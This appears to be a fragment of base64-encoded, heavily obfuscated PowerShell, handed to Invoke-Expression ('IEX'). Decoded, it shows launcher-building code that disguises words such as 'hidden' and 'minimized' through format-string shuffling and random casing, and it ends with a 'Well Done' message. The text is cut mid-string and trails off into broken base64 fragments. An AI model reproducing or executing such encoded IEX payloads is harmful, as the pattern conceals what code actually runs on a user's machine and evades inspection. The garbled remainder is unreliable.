JQnhtMURueUUzbUVmYzVzMElFcDFVbzJGKCdoaWRkJykpLChUM0k5dDVlaklCWG0xZG55ZTNNZWZjNVMwSWVwMXVPMkYoJ2hpZGRlJykpKSl9fQogICAgICAgICAgICAgICAgKCd7KC0oMyArIDEpICsgKC0xICsgOSkpfXsoLSgtNSArIDEzKSArICgtMTIgKyAyOCkpfXsoMSArICgtMSArIDIpKX17OH17KC0oMiAqIDIpICsgKDE3IC0gOSkpfXsoW2ludF0oMzIgLyA0KSl9eygoMiArIDApICogMyl9eygxMyAtIDYpfXsxfSctZidpJywnZCcsJ24nLCdtJywnbScsJ2knLCd6JywnZScsJ2knKSB7SWYoR2V0LVJhbmRvbSAtSW5wdXQgQCgwLi4xKSkgeyRBcmd1bWVudFZhbHVlID0gKEdldC1SYW5kb20gLUlucHV0IEAoKFQzSTl0NWVqaUJ4bTFEbllFM21FRkM1czBpRVAxdU8yZignMicpKSwoVDNJOVQ1RWppYnhtMURueUUzbWVGQzVTMGlFUDFVTzJmKCdtaScpKSwoVDNJOXQ1ZUpJQlhNMUROWUUzTUVGYzVzMElFcDF1bzJmKCdtaW4nKSksKHQzSTl0NUVqSUJ4bTFEbllFM21FZkM1czBpRVAxVU8yZignbWluaScpKSwodDNJOXQ1RWppQnhtMURueWUzbUVGYzVTMGlFcDFVTzJGKCdtaW5pbScpKSwoVDNpOXQ1ZWpJQlhNMURueUUzbUVmQzVzMEllUDF1TzJmKCdtaW5pbWknKSksKFQzSTlUNWVqSUJ4bTFEbnllM21FZmM1UzBJRXAxVU8yZignbWluaW1peicpKSwoVDNJOXQ1ZWppQnhtMURuWUUzTUVGYzVzMGlFUDF1TzJGKCdtaW5pbWl6ZScpKSkpfX0KICAgICAgICAgICAgICAgICgnezF9eygxIC0gMSl9Jy1mJ2l6ZWQnLCdtYXhpbScpIHtJZihHZXQtUmFuZG9tIC1JbnB1dCBAKDAuLjEpKSB7JEFyZ3VtZW50VmFsdWUgPSAoR2V0LVJhbmRvbSAtSW5wdXQgQCgoVDNJOVQ1ZUpJYnhNMURueWUzbUVmYzVTMGllUDFVTzJGKCcoW2ludF0oNiAvIDIpKScpKSwoVDNJOVQ1ZUppQnhtMWROeWUzTWVGQzVTMGllcDFVTzJGKCdtYScpKSwodDNJOXQ1RWpJQnhtMWROeUUzTUVmYzVTMGlFcDFVbzJGKCdtYXgnKSksKFQzSTl0NWVKSUJ4bTFEbllFM21lZkM1UzBJRXAxVU8yRignbWF4aScpKSwoVDNJOXQ1RWpJYnhNMURuWWUzbWVGYzVzMGllcDF1TzJmKCdtYXhpbScpKSwodDNJOXQ1RUppQnhtMUROWWUzbWVGYzVzMElFcDF1TzJmKCdtYXhpbWknKSksKHQzaTl0NWVqSWJYTTFEbllFM21lZmM1czBpZVAxVU8yZignbWF4aW1peicpKSwodDNJOXQ1ZWpJYnhtMWRuWUUzbUVmQzVTMElFcDFVTzJmKCdtYXhpbWl6ZScpKSkpfX0KICAgICAgICAgICAgICAgIGRlZmF1bHQge1dyaXRlLUVycm9yICgneygoMyAtIDIpICsgMyl9ezEyfXsoMSAqIDEzKX17Mn17KC0xICsgMil9eygoW2ludF0oNiAvIDIpKSAqIDMpfXsoKDMgLSAxKSAqICgyICogMikpfXsoLTggKyAoMTEgKyA3KSl9eygoMTcgLSA0KSAtICgtMiArIDQpKX17KC0xICsgNCl9eygzICogMil9ezB9eygyICsgMyl9eygxICogNyl9eyhbaW50XSg3MCAvICg1ICsgMCkpKX0nLWYnZm9yIE91dCcsJ2FsdWUgKCRkaUFzbmlyWnNqN2InLCdWYWx1ZSB2JywnIHN3aXRjaCcsJ0FuIGludmEnLCctUG93ZXJTJywnIGJsb2NrICcsJ2hlbGxMYXUnLCd0VmFsdWUpJywnQXJndW1lbicsJyB3YXMgcGEnLCdzc2VkIHRvJywnbGlkIGAkWWJzTUxCMG40eXBoS3JFTTlDY0YnLCdyZ3VtZW50JywnbmNoZXIuJyk7IEV4aXQ7fQogICAgICAgICAgICB9CgogICAgICAgICAgICAkUG93ZXJTaGVsbEZsYWdzICs9ICRGdWxsQXJndW1lbnQuU3ViU3RyaW5nKDAsKEdldC1SYW5kb20gLU1pbmltdW0gMiAtTWF4aW11bSAoJEZ1bGxBcmd1bWVudC5MZW5ndGgrMSkpKSArICcgJyooR2V0LVJhbmRvbSAtTWluaW11bSAxIC1NYXhpbXVtIDMpICsgJEFyZ3VtZW50VmFsdWUKICAgICAgICB9CiAgICAgICAgSWYoJFAKIkAKCndyaXRlLWhvc3QgIldlbGwgRG9uZSA6LX0iCg=="));IEX $pZW5kIGFuZCBJpZW5kIGFuZCBJIGRlY2lkZWIGRlY2lkZW
